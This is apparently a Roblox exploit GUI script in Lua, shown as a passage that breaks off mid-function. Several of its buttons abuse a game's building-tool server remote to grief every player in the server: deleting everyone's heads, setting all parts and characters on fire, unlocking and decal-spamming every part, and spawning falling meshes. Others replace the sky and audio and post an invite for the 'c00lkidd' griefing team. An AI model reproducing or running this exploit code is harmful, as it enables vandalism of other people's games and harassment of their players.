	button.MouseButton1Down:connect(function()
		basics = {Color3.new(255/255,0/255,0/255),Color3.new(255/255,85/255,0/255),Color3.new(218/255,218/255,0/255),Color3.new(0/255,190/255,0/255),Color3.new(0/255,85/255,255/255),Color3.new(0/255,0/255,127/255),Color3.new(170/255,0/255,255/255),Color3.new(0/255,204/255,204/255),Color3.new(255/255,85/255,127/255),Color3.new(0/255,0/255,0/255),Color3.new(255/255,255/255,255/255)}
		game.Lighting.FogStart = 25
		game.Lighting.FogEnd = 300
		while true do
			wait(0.5)
			game.Lighting.FogColor = basics[math.random(1,#basics)]
		end
	end)
end
coroutine.wrap(WKPRGIV_fake_script)()
local function UTRYB_fake_script() -- button_45.LocalScript 
	local script = Instance.new('LocalScript', button_45)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		local s = Instance.new("Sky")
		s.Name = "Sky"
		s.Parent = game.Lighting
		local skyboxID = 15475953475
		s.SkyboxBk = "http://www.roblox.com/asset/?id="..skyboxID
		s.SkyboxDn = "http://www.roblox.com/asset/?id="..skyboxID
		s.SkyboxFt = "http://www.roblox.com/asset/?id="..skyboxID
		s.SkyboxLf = "http://www.roblox.com/asset/?id="..skyboxID
		s.SkyboxRt = "http://www.roblox.com/asset/?id="..skyboxID
		s.SkyboxUp = "http://www.roblox.com/asset/?id="..skyboxID
		game.Lighting.TimeOfDay = 12

		decalID = 14569362147
		function exPro(root)
			for _, v in pairs(root:GetChildren()) do
				if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id="..decalID then
					v.Parent = nil
				elseif v:IsA("BasePart") then
					v.Material = "Plastic"
					v.Transparency = 0
					local One = Instance.new("Decal", v)
					local Two = Instance.new("Decal", v)
					local Three = Instance.new("Decal", v)
					local Four = Instance.new("Decal", v)
					local Five = Instance.new("Decal", v)
					local Six = Instance.new("Decal", v)
					One.Texture = "http://www.roblox.com/asset/?id="..decalID
					Two.Texture = "http://www.roblox.com/asset/?id="..decalID
					Three.Texture = "http://www.roblox.com/asset/?id="..decalID
					Four.Texture = "http://www.roblox.com/asset/?id="..decalID
					Five.Texture = "http://www.roblox.com/asset/?id="..decalID
					Six.Texture = "http://www.roblox.com/asset/?id="..decalID
					One.Face = "Front"
					Two.Face = "Back"
					Three.Face = "Right"
					Four.Face = "Left"
					Five.Face = "Top"
					Six.Face = "Bottom"
				end
				exPro(v)
			end
		end
		function asdf(root)
			for _, v in pairs(root:GetChildren()) do
				asdf(v)
			end
		end
		exPro(game.Workspace)
		asdf(game.Workspace)

		local playerLeaderstats = {}
		for i, v in pairs(game.Players:GetChildren()) do
			table.insert(playerLeaderstats, v)
		end
		for i, v in pairs(playerLeaderstats) do
			pe = Instance.new("ParticleEmitter",v.Character.Torso)
			pe.Texture = "http://www.roblox.com/asset/?id=14569362147"
			pe.VelocitySpread = 50
			se = Instance.new("ParticleEmitter",v.Character.Torso)
			se.Texture = "http://www.roblox.com/asset/?id=14569362147"
			se.VelocitySpread = 50
			fe = Instance.new("ParticleEmitter",v.Character.Torso)
			fe.Texture = "http://www.roblox.com/asset/?id=14569362147"
			fe.VelocitySpread = 50
		end

		for i,v in pairs(game.Workspace:GetChildren()) do
			if v.className == "Sound" then
				v:Stop()
				v:Remove()	
			end	
		end
		s = Instance.new("Sound",Workspace)
		s.SoundId = "rbxassetid://1839247124"
		s.Volume = 10
		s.Looped = true
		s.Pitch = 0.5
		s:Play()
		wait(.1)
		s:Play()

		local h = Instance.new("Hint", workspace)
		h.Text = "join team c00lkidd! discord.gg/KkhpkGJdCp"

	end)
end
coroutine.wrap(UTRYB_fake_script)()
local function AGPKAV_fake_script() -- button_46.LocalScript 
	local script = Instance.new('LocalScript', button_46)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		local playerLeaderstats = {}
		for i, v in pairs(game.Players:GetChildren()) do
			table.insert(playerLeaderstats, v)
		end
		for i, v in pairs(playerLeaderstats) do
			pe = Instance.new("ParticleEmitter",v.Character.Torso)
			pe.Texture = "http://www.roblox.com/asset/?id=8979672"
			pe.VelocitySpread = 50
			se = Instance.new("ParticleEmitter",v.Character.Torso)
			se.Texture = "http://www.roblox.com/asset/?id=176067516"
			se.VelocitySpread = 50
			fe = Instance.new("ParticleEmitter",v.Character.Torso)
			fe.Texture = "http://www.roblox.com/asset/?id=179012130"
			fe.VelocitySpread = 50
		end
	end)
end
coroutine.wrap(AGPKAV_fake_script)()
local function VBWFAA_fake_script() -- button_47.LocalScript 
	local script = Instance.new('LocalScript', button_47)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		--rgrg
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					--spawn(function()
					SetName(v,"Sky")
					AddMesh(v)
					--end)
					--spawn(function()
					SetMesh(v,"8006679977")
					SetTexture(v,id)
					--end)
					MeshResize(v,Vector3.new(50,50,50))
					SetLocked(v,true)
				end
			end
		end
		Sky(game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.sdid.Text)
	
	end)
end
coroutine.wrap(VBWFAA_fake_script)()
local function RXFTK_fake_script() -- button_48.LocalScript 
	local script = Instance.new('LocalScript', button_48)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		--rgrg
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						SpawnDecal(v,Enum.NormalId.Front)
						AddDecal(v,id,Enum.NormalId.Front)
	
						SpawnDecal(v,Enum.NormalId.Back)
						AddDecal(v,id,Enum.NormalId.Back)
	
						SpawnDecal(v,Enum.NormalId.Right)
						AddDecal(v,id,Enum.NormalId.Right)
	
						SpawnDecal(v,Enum.NormalId.Left)
						AddDecal(v,id,Enum.NormalId.Left)
	
						SpawnDecal(v,Enum.NormalId.Bottom)
						AddDecal(v,id,Enum.NormalId.Bottom)
	
						SpawnDecal(v,Enum.NormalId.Top)
						AddDecal(v,id,Enum.NormalId.Top)
					end)
				end
			end 
		end
		spam(game.Players.LocalPlayer.PlayerGui.CoolGui.settings.smain.sdid.Text)
	end)
end
coroutine.wrap(RXFTK_fake_script)()
local function VANYF_fake_script() -- button_49.LocalScript 
	local script = Instance.new('LocalScript', button_49)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function AddFire(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
			_(args)
		end
		function FireParts()
			for i,v in game.Workspace:GetDescendants() do
				spawn(function()
					SetLocked(v,false)
					AddFire(v)
				end)
			end
		end
		FireParts()
	
	end)
end
coroutine.wrap(VANYF_fake_script)()
local function HZJA_fake_script() -- button_50.LocalScript 
	local script = Instance.new('LocalScript', button_50)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		--rgrg
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = workspace.Part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function AddFire(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
			_(args)
		end
	
		function Fire(player)
			for i,v in player.Character:GetDescendants() do
				if v:IsA("BasePart") then
					AddFire(v)
				end
			end
			DestroyPart(player.Character.Head)
		end
	
		for i,v in game.Players:GetPlayers() do
			spawn(function()
				pcall(function()
					Fire(v)
				end)
			end)
		end
	end)
end
coroutine.wrap(HZJA_fake_script)()
local function EGDK_fake_script() -- button_51.LocalScript 
	local script = Instance.new('LocalScript', button_51)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		--rgrg
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = workspace
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = workspace.Part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		hrpcf = player.Character.HumanoidRootPart.CFrame
		while wait(0.5) do
			x = hrpcf.x
			z = hrpcf.z
			randint = math.random(-600,600)
			randint2 = math.random(-600,600)
			xloc = randint + x
			zloc = randint2 + z
			cf = player.Character.HumanoidRootPart.CFrame.y + 400
			spawn(function()
				CreatePart(CFrame.new(math.floor(xloc), math.random(cf,cf+400), math.floor(zloc)))
				for i,v in game.Workspace:GetDescendants() do
					if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
						SetName(v,"b_1337")
						SetAnchor(false,v)
						AddMesh(v)
						Resize(v, Vector3.new(100,100,100),v.CFrame)
						MeshResize(v,Vector3.new(3,3,3))
						SetMesh(v,"614605299")
						SetTexture(v, "614605300")
						SetCollision(v,false)
					else
					end
				end	
			end)
		end
	end)
end
coroutine.wrap(EGDK_fake_script)()
local function QDRG_fake_script() -- button_52.LocalScript 
	local script = Instance.new('LocalScript', button_52)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
	
		function KillAll()
			for i,v in game.Players:GetPlayers() do
				spawn(function()
					SetLocked(v.Character.Head,false)
					DestroyPart(v.Character.Head)
				end)
			end
		end
		KillAll()
	end)
end
coroutine.wrap(QDRG_fake_script)()
local function LQAKNWI_fake_script() -- button_53.LocalScript 
	local script = Instance.new('LocalScript', button_53)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
			local player = game.Players.LocalPlayer
			local char = player.Character
			local tool
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for i,v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			--craaa
			remote = tool.SyncAPI.ServerEndpoint
			function _(args)
				remote:InvokeServer(unpack(args))
			end
			function SetCollision(part,boolean)
				local args = {
					[1] = "SyncCollision",
					[2] = {
						[1] = {
							["Part"] = part,
							["CanCollide"] = boolean
						}
					}
				}
				_(args)
			end
			function SetAnchor(boolean,part)
				local args = {
					[1] = "SyncAnchor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Anchored"] = boolean
						}
					}
				}
				_(args)
			end
			function CreatePart(cf,parent,types)
				local args = {
					[1] = "CreatePart",
					[2] = types,
					[3] = cf,
					[4] = parent
				}
				_(args)
			end
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				_(args)
			end
			function MovePart(part,cf)
				local args = {
					[1] = "SyncMove",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf
						}
					}
				}
				_(args)
			end
			function Resize(part,size,cf)
				local args = {
					[1] = "SyncResize",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf,
							["Size"] = size
						}
					}
				}
				_(args)
